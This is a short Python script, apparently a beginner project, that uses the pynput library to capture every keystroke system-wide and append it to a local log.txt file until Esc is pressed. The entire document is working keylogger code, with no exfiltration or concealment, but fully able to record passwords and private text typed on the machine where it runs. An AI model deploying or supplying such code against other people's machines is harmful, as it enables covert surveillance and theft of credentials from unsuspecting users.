from pynput.keyboard import Listener,Key
def write_to_file(keey):
    letter = str(keey)
    letter= letter.replace("'","")
    if letter == 'Key.space':
        letter =' '
    if letter =='Key.shift':
        letter= ''
    if letter =='Key.enter':
        letter ="\n"
    with open("D:\LANGUAGE\Python\Project\KeyLogger\log.txt","a") as f:
        f.write(letter)
        if keey ==Key.esc:
            return False
with Listener(on_press=write_to_file) as l:
    l.join()
